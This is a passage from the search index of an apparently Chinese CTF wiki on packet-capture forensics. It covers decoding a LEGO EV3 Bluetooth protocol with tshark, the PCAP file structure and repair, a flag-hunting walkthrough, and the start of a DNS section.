flag</code></p>"},{"location":"misc/traffic/data/#_5","title":"\u81ea\u5b9a\u4e49\u534f\u8bae","text":"<p>\u63d0\u53d6\u6570\u636e\u5b58\u5728\u4e00\u7c7b\u7279\u6b8a\u60c5\u51b5\uff0c\u5373\u4f20\u8f93\u7684\u6570\u636e\u672c\u8eab\u4f7f\u7528\u81ea\u5b9a\u4e49\u534f\u8bae\uff0c\u4e0b\u9762\u7528 <code>HITCON 2018</code> \u7684\u4e24\u9053 Misc \u4e3a\u4f8b\u8bf4\u660e\u3002</p>"},{"location":"misc/traffic/data/#_6","title":"\u4f8b\u9898\u5206\u6790","text":"<ul> <li> <p>HITCON-2018 : ev3 basic</p> </li> <li> <p>HITCON-2018 : ev3 scanner</p> </li> </ul> <p>ev3 basic</p>"},{"location":"misc/traffic/data/#_7","title":"\u786e\u5b9a\u6570\u636e","text":"<p>\u5bf9\u4e8e\u8fd9\u7c7b\u9898\u76ee\uff0c\u9996\u5148\u5206\u6790\u6709\u6548\u6570\u636e\u4f4d\u4e8e\u54ea\u4e9b\u5305\u4e2d\u3002\u89c2\u5bdf\u6d41\u91cf\uff0c\u901a\u8baf\u53cc\u65b9\u4e3a <code>localhost</code> \u548c <code>LegoSystem</code> \u3002\u5176\u4e2d\u5927\u91cf\u6807\u4e3a <code>PKTLOG</code> \u7684\u6570\u636e\u5305\u90fd\u662f\u65e5\u5fd7\uff0c\u6b64\u9898\u4e2d\u4e0d\u9700\u5173\u6ce8\u3002\u7b80\u5355\u6d4f\u89c8\u5176\u4f59\u5404\u4e2a\u534f\u8bae\u7684\u6d41\u91cf\uff0c\u53d1\u73b0\u4ec5 <code>RFCOMM</code> \u534f\u8bae\u4e2d\u5b58\u5728\u6ca1\u6709\u88ab <code>wireshark</code> \u89e3\u6790\u7684 <code>data</code> \u6bb5\uff0c\u800c <code>RFCOMM</code> \u6b63\u662f\u84dd\u7259\u4f7f\u7528\u7684\u4f20\u8f93\u5c42\u534f\u8bae\u4e4b\u4e00\u3002</p> <p>\u7531\u524d\u8ff0 <code>tshark</code> \u76f8\u5173\u4ecb\u7ecd\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u63d0\u53d6\u6570\u636e\uff1a</p> <p><code>tshark -r .\\ev3_basic.pklg -T fields -e data -Y \"btrfcomm\"</code></p>"},{"location":"misc/traffic/data/#_8","title":"\u5206\u6790\u534f\u8bae","text":"<p>\u627e\u5230\u6570\u636e\u540e\uff0c\u9700\u8981\u786e\u5b9a\u6570\u636e\u683c\u5f0f\u3002\u5982\u4f55\u67e5\u627e\u8d44\u6599\u53ef\u4ee5\u53c2\u8003 <code>\u4fe1\u606f\u641c\u96c6\u6280\u672f</code> \u4e00\u8282\uff0c\u6b64\u5904\u4e0d\u518d\u8d58\u8ff0\u3002\u603b\u4e4b\u7531 <code>ev3</code> \u8fd9\u4e2a\u5173\u952e\u8bcd\u51fa\u53d1\uff0c\u6211\u4eec\u6700\u7ec8\u77e5\u9053\u8fd9\u79cd\u901a\u4fe1\u65b9\u5f0f\u4f20\u8f93\u7684\u5185\u5bb9\u88ab\u79f0\u4e4b\u4e3a Direct Command\uff0c\u6240\u4f7f\u7528\u7684\u662f\u4e50\u9ad8\u81ea\u5b9a\u4e49\u7684\u4e00\u79cd\u7b80\u5355\u5e94\u7528\u5c42\u534f\u8bae\uff0c<code>Command</code> \u672c\u8eab\u683c\u5f0f\u7531\u4e50\u9ad8\u7684\u624b\u518c EV3 Firmware Developer Kit \u5b9a\u4e49\u3002\uff08\u67e5\u627e\u8fc7\u7a0b\u5e76\u4e0d\u50cf\u6b64\u5904\u7b80\u5355\u800c\u76f4\u89c2\uff0c\u4e5f\u662f\u672c\u9898\u7684\u5173\u952e\u70b9\u4e4b\u4e00\u3002\uff09</p> <p>\u5728\u4e50\u9ad8\u7684\u534f\u8bae\u4e2d\uff0c\u53d1\u9001\u548c\u56de\u590d\u9075\u4ece\u4e0d\u540c\u683c\u5f0f\u3002\u5728 <code>ev3 basic</code> \u4e2d\uff0c\u6240\u6709\u56de\u590d\u6d41\u91cf\u90fd\u76f8\u540c\uff0c\u901a\u8fc7\u624b\u518c\u53ef\u77e5\u5185\u5bb9\u4ee3\u8868 <code>ok</code> \uff0c\u6ca1\u6709\u5b9e\u9645\u542b\u4e49\uff0c\u800c\u53d1\u9001\u7684\u6bcf\u4e2a\u6570\u636e\u5305\u90fd\u5305\u542b\u4e86\u4e00\u6761\u6307\u4ee4\u3002\u7531\u534f\u8bae\u683c\u5f0f\u89e3\u6790\u51fa\u6307\u4ee4\u7684 <code>Opcode</code> \u5747\u4e3a <code>0x84</code> \uff0c\u4ee3\u8868 <code>UI_DRAW</code> \u51fd\u6570\uff0c\u4e14 <code>CMD</code> \u662f <code>0x05</code> \uff0c\u4ee3\u8868 <code>TEXT</code> \u3002\u4e4b\u540e\u662f\u56db\u4e2a\u53c2\u6570\uff0c<code>Color</code>, <code>X0</code>, <code>Y0</code>, <code>STRING</code> \u3002\u6b64\u5904\u9700\u8981\u6ce8\u610f\u4e50\u9ad8\u7684\u5355\u4e2a\u53c2\u6570\u5b57\u8282\u6570\u5e76\u4e0d\u56fa\u5b9a\uff0c\u5373\u4fbf\u624b\u518c\u4e0a\u6807\u660e\u4e86\u6570\u636e\u7c7b\u578b\u662f <code>DATA16</code> \uff0c\u4ecd\u7136\u53ef\u80fd\u4f7f\u7528\u4e00\u4e2a\u5b57\u8282\u957f\u5ea6\u7684\u53c2\u6570\uff0c\u9700\u8981\u53c2\u7167\u624b\u518c\u4e2d <code>Parameter encoding</code> \u4e00\u8282\u53ca\u76f8\u5173\u6587\u7ae0\u3002</p> <p>\u5c1d\u8bd5\u5206\u6790\u51e0\u4e2a\u547d\u4ee4\uff0c\u53d1\u73b0\u6bcf\u4e2a\u6307\u4ee4\u90fd\u4f1a\u5728\u5c4f\u5e55\u7279\u5b9a\u4f4d\u7f6e\u6253\u5370\u4e00\u4e2a\u5b57\u7b26\uff0c\u8fd9\u4e0e\u63d0\u4f9b\u7684\u56fe\u7247\u76f8\u7b26\u3002</p>"},{"location":"misc/traffic/data/#_9","title":"\u5904\u7406\u7ed3\u679c","text":"<p>\u7406\u89e3\u6570\u636e\u5185\u5bb9\u540e\uff0c\u901a\u8fc7\u811a\u672c\u63d0\u53d6\u6240\u6709\u547d\u4ee4\u5e76\u89e3\u6790\u53c2\u6570\uff0c\u9700\u8981\u6ce8\u610f\u5355\u4e2a\u53c2\u6570\u7684\u5b57\u8282\u6570\u4e0d\u56fa\u5b9a\u3002</p> <p>\u5f97\u5230\u6240\u6709\u547d\u4ee4\u7684\u53c2\u6570\u540e\uff0c\u53ef\u4ee5\u5c06\u6bcf\u4e2a\u5b57\u7b26\u5176\u6309\u7167\u5750\u6807\u7ed8\u5236\u5728\u5c4f\u5e55\u4e0a\u3002\u8f83\u7b80\u5355\u7684\u505a\u6cd5\u662f\u5148\u6309 <code>X</code> \u540e\u6309 <code>Y</code> \u6392\u5e8f\uff0c\u76f4\u63a5\u8f93\u51fa\u5373\u53ef\u3002</p> <p>ev3 scanner</p> <p>\u7b2c\u4e8c\u9898\u7684\u505a\u6cd5\u4e0e\u7b2c\u4e00\u9898\u57fa\u672c\u76f8\u540c\uff0c\u96be\u5ea6\u589e\u52a0\u7684\u5730\u65b9\u5728\u4e8e\uff1a</p> <ul> <li> <p>\u53d1\u9001\u7684\u547d\u4ee4\u4e0d\u518d\u5355\u4e00\uff0c\u5305\u62ec\u8bfb\u53d6\u4f20\u611f\u5668\u4fe1\u606f\u3001\u63a7\u5236 ev3 \u8fd0\u52a8</p> </li> <li> <p>\u56de\u590d\u4e5f\u5305\u542b\u4fe1\u606f\uff0c\u4e3b\u8981\u662f\u4f20\u611f\u5668\u8bfb\u53d6\u7684\u5185\u5bb9</p> </li> <li> <p>\u51fd\u6570\u7684\u53c2\u6570\u66f4\u590d\u6742\uff0c\u89e3\u6790\u96be\u5ea6\u66f4\u5927</p> </li> <li> <p>\u89e3\u6790\u547d\u4ee4\u5f97\u5230\u7684\u7ed3\u679c\u9700\u8981\u66f4\u591a\u5904\u7406</p> </li> </ul> <p><code>ev3 scanner</code> \u6b64\u5904\u4e0d\u518d\u63d0\u4f9b\u8be6\u7ec6\u65b9\u6cd5\uff0c\u53ef\u4f5c\u4e3a\u7ec3\u4e60\u52a0\u6df1\u5bf9\u8fd9\u4e00\u7c7b\u578b\u9898\u76ee\u7684\u7406\u89e3\u3002</p>"},{"location":"misc/traffic/data/#python-script","title":"Python Script","text":"<p>TODO</p>"},{"location":"misc/traffic/fix/","title":"PCAP \u6587\u4ef6\u4fee\u590d","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/traffic/fix/#pcap_1","title":"PCAP\u6587\u4ef6\u7ed3\u6784","text":"<p>\u4e00\u822c\u6765\u8bf4,\u5bf9\u4e8e <code>PCAP</code> \u6587\u4ef6\u683c\u5f0f\u8003\u5bdf\u8f83\u5c11\uff0c\u4e14\u901a\u5e38\u90fd\u80fd\u501f\u52a9\u4e8e\u73b0\u6210\u7684\u5de5\u5177\u5982 <code>pcapfix</code> \u76f4\u63a5\u4fee\u590d\uff0c\u8fd9\u91cc\u5927\u81f4\u4ecb\u7ecd\u4e0b\u51e0\u4e2a\u5e38\u89c1\u7684\u5757\uff0c\u8be6\u7ec6\u53ef\u4ee5\u7ffb\u770bHere\u3002</p> <ul> <li>Tools<ul> <li>PcapFix Online</li> <li>PcapFix</li> </ul> </li> </ul> <p>\u4e00\u822c\u6587\u4ef6\u7ed3\u6784</p> <pre><code>    0                   1                   2                   3   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                          Block Type                           |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                      Block Total Length                       |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                          Block Body                           /\n   /          /* variable length, aligned to 32 bits */            /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                      Block Total Length                       |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n</code></pre> <p>\u76ee\u524d\u6240\u5b9a\u4e49\u7684\u5e38\u89c1\u5757\u7c7b\u578b\u6709</p> <ol> <li>Section Header Block: it defines the most important characteristics of the capture file.</li> <li>Interface Description Block: it defines the most important characteristics of the interface(s) used for capturing traffic.</li> <li>Packet Block: it contains a single captured packet, or a portion of it.</li> <li>Simple Packet Block: it contains a single captured packet, or a portion of it, with only a minimal set of information about it.</li> <li>Name Resolution Block: it defines the mapping from numeric addresses present in the packet dump and the canonical name counterpart.</li> <li>Capture Statistics Block: it defines how to store some statistical data (e.g. packet dropped, etc) which can be useful to undestand the conditions in which the capture has been made.</li> </ol>"},{"location":"misc/traffic/fix/#_1","title":"\u5e38\u89c1\u5757","text":""},{"location":"misc/traffic/fix/#section-header-block","title":"Section Header BlocK(\u6587\u4ef6\u5934)","text":"<p>\u5fc5\u987b\u5b58\u5728,\u610f\u5473\u7740\u6587\u4ef6\u7684\u5f00\u59cb</p> <pre><code>    0                   1                   2                   3   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                Byte-Order Magic (0x1A2B3C4D)                  |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |   Major Version(\u4e3b\u7248\u672c\u53f7)   |    Minor Version(\u6b21\u7248\u672c\u53f7)        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                                                               |\n|                          Section Length                       |\n|                                                               |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                                                               /\n   /                      Options (variable)                       /\n   /                                                               /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n</code></pre>"},{"location":"misc/traffic/fix/#interface-description-block","title":"Interface Description Block(\u63a5\u53e3\u63cf\u8ff0)","text":"<p>\u5fc5\u987b\u5b58\u5728,\u63cf\u8ff0\u63a5\u53e3\u7279\u6027</p> <pre><code>    0                   1                   2                   3   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |           LinkType            |           Reserved            |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                  SnapLen(\u6bcf\u4e2a\u6570\u636e\u5305\u6700\u5927\u5b57\u8282\u6570)                  |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                                                               /\n   /                      Options (variable)                       /\n   /                                                               /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n</code></pre>"},{"location":"misc/traffic/fix/#packet-block","title":"Packet Block(\u6570\u636e\u5757)","text":"<pre><code>    0                   1                   2                   3   0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |         Interface ID          |          Drops Count          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                     Timestamp (High)   \u6807\u51c6\u7684Unix\u683c\u5f0f          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                        Timestamp (Low)                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                         Captured Len                          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   |                          Packet Len                           |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                          Packet Data                          /\n   /          /* variable length, aligned to 32 bits */            /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n   /                      Options (variable)                       /\n   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n</code></pre>"},{"location":"misc/traffic/fix/#_2","title":"\u4f8b\u9898","text":"<p>\u9898\u76ee\uff1a\u7b2c\u4e00\u5c4a\u201c\u767e\u5ea6\u676f\u201d\u4fe1\u606f\u5b89\u5168\u653b\u9632\u603b\u51b3\u8d5b \u7ebf\u4e0a\u9009\u62d4\u8d5b\uff1afind the flag</p> <p>WP\uff1ahttps://www.cnblogs.com/ECJTUACM-873284962/p/9884447.html</p> <p>\u9996\u5148\u6211\u4eec\u62ff\u5230\u8fd9\u6837\u4e00\u9053\u6d41\u91cf\u5305\u7684\u9898\u76ee\uff0c\u9898\u76ee\u540d\u79f0\u4e3a <code>find the flag</code> \u3002\u8fd9\u91cc\u9762\u7ed9\u4e86\u5f88\u591a\u63d0\u793a\u4fe1\u606f\uff0c\u8981\u6211\u4eec\u53bb\u627e\u5230 <code>flag</code> \u3002</p> <p>\u7b2c\u4e00\u6b65\uff0c\u641c\u7d22 <code>flag</code> \u5b57\u6837</p> <p>\u6211\u4eec\u5148\u53bb\u641c\u7d22\u770b\u770b\u6d41\u91cf\u5305\u91cc\u9762\u6709\u6ca1\u6709 <code>flag</code> \u3002\u6211\u4eec\u4f7f\u7528 <code>strings</code> \u547d\u4ee4\u53bb\u627e\u4e00\u4e0b\u6d41\u91cf\u5305\uff0c <code>Windows</code> \u7684\u670b\u53cb\u53ef\u4ee5\u7528 <code>notepad++</code> \u7684\u641c\u7d22\u529f\u80fd\u53bb\u5bfb\u627e\u3002</p> <p>\u641c\u7d22\u547d\u4ee4\u5982\u4e0b\uff1a</p> <pre><code>strings findtheflag.cap | grep flag\n</code></pre> <p>\u641c\u7d22\u7ed3\u679c\u5982\u4e0b\uff1a</p> <p></p> <p>\u6211\u4eec\u53d1\u73b0\u641c\u51fa\u4e86\u4e00\u5927\u5806\u7684\u4e1c\u897f\uff0c\u6211\u4eec\u901a\u8fc7\u7ba1\u9053\u53bb\u8fc7\u6ee4\u51fa <code>flag</code> \u4fe1\u606f\uff0c\u4f3c\u4e4e\u6ca1\u6709\u53d1\u73b0\u6211\u4eec\u6240\u9700\u8981\u627e\u7684\u7b54\u6848\u3002</p> <p>\u7b2c\u4e8c\u6b65\uff0c\u6d41\u91cf\u5305\u4fee\u590d</p> <p>\u6211\u4eec\u7528 <code>wireshark</code> \u6253\u5f00\u8fd9\u4e2a\u6d41\u91cf\u5305</p> <p></p> <p>\u6211\u4eec\u53d1\u73b0\u8fd9\u4e2a\u6d41\u91cf\u5305\u51fa\u73b0\u4e86\u5f02\u5e38\u73b0\u8c61\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u590d\u4e00\u4e0b\u8fd9\u4e2a\u6d41\u91cf\u5305\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u7528\u5230\u4e00\u4e2a\u5728\u7ebf\u5de5\u5177\uff1ahttp://f00l.de/hacking/pcapfix.php</p> <p>\u8fd9\u4e2a\u5de5\u5177\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5feb\u901f\u5730\u5c06\u5176\u6d41\u91cf\u5305\u4fee\u590d\u4e3a <code>pcap</code> \u5305\u3002</p> <p>\u6211\u4eec\u5bf9\u5176\u8fdb\u884c\u5728\u7ebf\u4fee\u590d\u3002</p> <p></p> <p>\u4fee\u590d\u5b8c\u6bd5\u540e\u70b9\u51fb <code>Get your repaired PCAP-file here.</code> \u5373\u53ef\u4e0b\u8f7d\u6d41\u91cf\u5305\uff0c\u7136\u540e\u6211\u4eec\u7528 <code>wireshark</code> \u6253\u5f00\u3002</p> <p>\u65e2\u7136\u8fd8\u662f\u8981\u627e <code>flag</code> \uff0c\u6211\u4eec\u53ef\u4ee5\u5148\u770b\u770b\u8fd9\u4e2a\u6d41\u91cf\u5305\u3002</p> <p>\u7b2c\u4e09\u6b65\uff0c\u8ffd\u8e2aTCP\u6d41</p> <p>\u6211\u4eec\u8ffd\u8e2a\u4e00\u4e0bTCP\u6d41\uff0c\u770b\u770b\u6709\u6ca1\u6709\u4ec0\u4e48\u7a81\u7834\uff1f</p> <p></p> <p>\u6211\u4eec\u901a\u8fc7\u8ffd\u8e2a <code>TCP</code> \u6d41\uff0c\u53ef\u4ee5\u770b\u5230\u4e00\u4e9b\u7248\u672c\u4fe1\u606f\uff0c <code>cookie</code> \u7b49\u7b49\uff0c\u6211\u4eec\u8fd8\u662f\u53d1\u73b0\u4e86\u4e00\u4e9b\u5f88\u6709\u610f\u601d\u7684\u4e1c\u897f\u3002</p> <p>\u4ece <code>tcp.stream eq 29</code> \u5230 <code>tcp.stream eq 41</code> \u53ea\u663e\u793a\u4e86 <code>where is the flag?</code> \u8fd9\u4e2a\u5b57\u6837\uff0c\u96be\u9053\u8fd9\u662f\u51fa\u9898\u4eba\u5728\u544a\u8bc9\u6211\u4eec <code>flag</code> \u5728\u8fd9\u91cc\u561b\uff1f</p> <p>\u7b2c\u56db\u6b65\uff0c\u67e5\u627e\u5206\u7ec4\u5b57\u8282\u6d41</p> <p>\u6211\u4eec\u8ffd\u8e2a\u5230 <code>tcp.stream eq 29</code> \u7684\u65f6\u5019\uff0c\u5728 <code>Identification</code> \u4fe1\u606f\u4e2d\u770b\u5230\u4e86 <code>flag</code> \u4e2d\u7684 <code>lf</code> \u5b57\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u8ffd\u8e2a\u4e0b\u4e00\u4e2a\u6d41\uff0c\u5728 <code>tcp.stream eq 30</code> \u7684 <code>Identification</code> \u4fe1\u606f\u4e2d\u770b\u5230\u4e86 <code>flag</code> \u4e2d\u7684 <code>ga</code> \u5b57\u6837\uff0c\u6211\u4eec\u53d1\u73b0\u5c06\u4e24\u4e2a\u5305\u4e2d <code>Identification</code> \u4fe1\u606f\u5bf9\u5e94\u7684\u5b57\u6bb5\u4ece\u53f3\u81f3\u5de6\u7ec4\u5408\uff0c\u6070\u597d\u5c31\u662f <code>flag</code> \uff01\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u5927\u80c6\u5730\u731c\u6d4b\uff0c <code>flag</code> \u80af\u5b9a\u662f\u85cf\u5728\u8fd9\u91cc\u9762\u3002</p> <p>\u6211\u4eec\u76f4\u63a5\u901a\u8fc7\u641c\u7d22-&gt;\u5b57\u7b26\u4e32\u641c\u7d22-&gt;\u5206\u7ec4\u5b57\u8282\u6d41-&gt;\u641c\u7d22\u5173\u952e\u5b57 <code>flag</code> \u5373\u53ef\uff0c\u6309\u7167\u540c\u6837\u7684\u65b9\u5f0f\u8fde\u63a5\u540e\u9762\u76f8\u8fde\u6570\u636e\u5305\u7684 <code>Identification</code> \u4fe1\u606f\u5bf9\u5e94\u7684\u5b57\u6bb5\uff0c\u5373\u53ef\u627e\u5230\u6700\u7ec8\u7684flag\uff01</p> <p>\u4e0b\u9762\u662f\u641c\u7d22\u7684\u622a\u56fe\uff1a</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u6240\u4ee5\u6700\u7ec8\u7684 <code>flag</code> \u4e3a\uff1aflag{aha!_you_found_it!}</p>"},{"location":"misc/traffic/fix/#_3","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>http://www.tcpdump.org/pcap/pcap.html</li> <li>https://zhuanlan.zhihu.com/p/27470338</li> <li>https://www.cnblogs.com/ECJTUACM-873284962/p/9884447.html</li> </ul>"},{"location":"misc/traffic/introduction/","title":"\u6d41\u91cf\u5305\u5206\u6790\u7b80\u4ecb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>CTF \u6bd4\u8d5b\u4e2d,\u6d41\u91cf\u5305\u7684\u53d6\u8bc1\u5206\u6790\u662f\u53e6\u4e00\u9879\u91cd\u8981\u7684\u8003\u5bdf\u65b9\u5411\u3002</p> <p>\u901a\u5e38\u6bd4\u8d5b\u4e2d\u4f1a\u63d0\u4f9b\u4e00\u4e2a\u5305\u542b\u6d41\u91cf\u6570\u636e\u7684 PCAP \u6587\u4ef6\uff0c\u6709\u65f6\u5019\u4e5f\u4f1a\u9700\u8981\u9009\u624b\u4eec\u5148\u8fdb\u884c\u4fee\u590d\u6216\u91cd\u6784\u4f20\u8f93\u6587\u4ef6\u540e\uff0c\u518d\u8fdb\u884c\u5206\u6790\u3002</p> <p>PCAP \u8fd9\u4e00\u5757\u4f5c\u4e3a\u91cd\u70b9\u8003\u5bdf\u65b9\u5411\uff0c\u590d\u6742\u7684\u5730\u65b9\u5728\u4e8e\u6570\u636e\u5305\u91cc\u5145\u6ee1\u7740\u5927\u91cf\u65e0\u5173\u7684\u6d41\u91cf\u4fe1\u606f\uff0c\u56e0\u6b64\u5982\u4f55\u5206\u7c7b\u548c\u8fc7\u6ee4\u6570\u636e\u662f\u53c2\u8d5b\u8005\u9700\u8981\u5b8c\u6210\u7684\u5de5\u4f5c\u3002</p> <p>\u603b\u7684\u6765\u8bf4\u6709\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4</p> <ul> <li>\u603b\u4f53\u628a\u63e1<ul> <li>\u534f\u8bae\u5206\u7ea7</li> <li>\u7aef\u70b9\u7edf\u8ba1</li> </ul> </li> <li>\u8fc7\u6ee4\u8d5b\u9009<ul> <li>\u8fc7\u6ee4\u8bed\u6cd5</li> <li>Host\uff0cProtocol\uff0ccontains\uff0c\u7279\u5f81\u503c</li> </ul> </li> <li>\u53d1\u73b0\u5f02\u5e38<ul> <li>\u7279\u6b8a\u5b57\u7b26\u4e32</li> <li>\u534f\u8bae\u67d0\u5b57\u6bb5</li> <li>flag \u4f4d\u4e8e\u670d\u52a1\u5668\u4e2d</li> </ul> </li> <li>\u6570\u636e\u63d0\u53d6<ul> <li>\u5b57\u7b26\u4e32\u53d6</li> <li>\u6587\u4ef6\u63d0\u53d6</li> </ul> </li> </ul> <p>\u603b\u7684\u6765\u8bf4\u6bd4\u8d5b\u4e2d\u7684\u6d41\u91cf\u5206\u6790\u53ef\u4ee5\u6982\u62ec\u4e3a\u4ee5\u4e0b\u4e09\u4e2a\u65b9\u5411:</p> <ul> <li>\u6d41\u91cf\u5305\u4fee\u590d</li> <li>\u534f\u8bae\u5206\u6790</li> <li>\u6570\u636e\u63d0\u53d6</li> </ul>"},{"location":"misc/traffic/protocols/dns/","title":"DNS","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"misc/traffic/protocols/dns/#_1","title":"\u7b80\u4ecb","text":"<p><code>DNS</code> \u901a\u5e38\u4e3a <code>UDP</code> \u534f\u8bae,\u62a5\u6587\u683c\u5f0f</p> <pre><code>+-------------------------------+\n| \u62a5\u6587\u5934                         |\n+-------------------------------+\n| \u95ee\u9898 (\u5411\u670d\u52a1\u5668\u63d0\u51fa\u7684\u67e5\u8be2\u90e8\u5206)    |\n+-------------------------------+\n| \u56de\u7b54 (\u670d\u52a1\u5668\u56de\u590d\u7684\u8d44\u6e90\u8bb0\u5f55)      |\n+-------------------------------+\n| \u6388\u6743 (\u6743\u5a01\u7684\u8d44\u6e90\u8bb0\u5f55)           |\n+-------------------------------+\n| \u989d\u5916\u7684 (\u989d\u5916\u7684\u8d44\u6e90\u8bb0\u5f55)         |\n+-------------------------------+\n</code></pre> <p>\u67e5\u8be2\u5305\u53ea\u6709\u5934\u90e8\u548c\u95ee\u9898\u4e24\u4e2a\u90e8\u5206\uff0c <code>DNS</code> \u6536\u5230\u67e5\u8be2\u5305\u540e\uff0c\u6839\u636e\u67e5\u8be2\u5230\u7684\u4fe1\u606f\u8ffd\u52a0\u56de\u7b54\u4fe1\u606f\u3001\u6388\u6743\u673a\u6784\u3001\u989d\u5916\u8d44\u6e90\u8bb0\u5f55\uff0c\u5e76\u4e14\u4fee\u6539\u4e86\u5305\u5934\u7684\u76f8\u5173\u6807\u8bc6\u518d\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002</p> <p>\u6bcf\u4e2a <code>question</code> \u90e8\u5206</p> <pre><code>   0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n |                                               |\n /                     QNAME                     /\n /                                               /\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n |                     QTYPE                     |\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n |                     QCLASS                    |\n +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+\n</code></pre> <ul> <li><code>QNAME</code> \uff1a\u4e3a\u67e5\u8be2\u7684\u57df\u540d\uff0c\u662f\u53ef\u53d8\u957f\u7684\uff0c\u7f16\u7801\u683c\u5f0f\u4e3a\uff1a\u5c06\u57df\u540d\u7528.\u53f7\u5212\u5206\u4e3a\u591a\u4e2a\u90e8\u5206\uff0c\u6bcf\u4e2a\u90e8\u5206\u524d\u9762\u52a0\u4e0a\u4e00\u4e2a\u5b57\u8282\u8868\u793a\u8be5\u90e8\u5206\u7684\u957f\u5ea6\uff0c\u6700\u540e\u52a0\u4e00\u4e2a <code>0</code> \u5b57\u8282\u8868\u793a\u7ed3\u675f</li> <li><code>QTYPE</code> \uff1a\u5360 <code>16</code> \u4f4d\uff0c\u8868\u793a\u67e5\u8be2\u7c7b\u578b\uff0c\u5171\u6709 <code>16</code> \u79cd\uff0c\u5e38\u7528\u503c\u6709\uff1a<code>1</code> ( <code>A</code> \u8bb0\u5f55\uff0c\u8bf7\u6c42\u4e3b\u673a <code>IP</code> \u5730\u5740)\u3001<code>2</code> ( <code>NS</code> \uff0c\u8bf7\u6c42\u6388\u6743 <code>DNS</code> \u670d\u52a1\u5668)\u3001<code>5</code> ( <code>CNAME</code> \u522b\u540d\u67e5\u8be2)</li> </ul>"},{"location":"misc/traffic/protocols/dns/#_2","title":"\u4f8b\u9898","text":"<p>\u9898\u76ee\uff1a<code>BSides San Francisco CTF 2017</code> \uff1a <code>dnscap.pcap</code> </p> <p>\u6211\u4eec\u901a\u8fc7 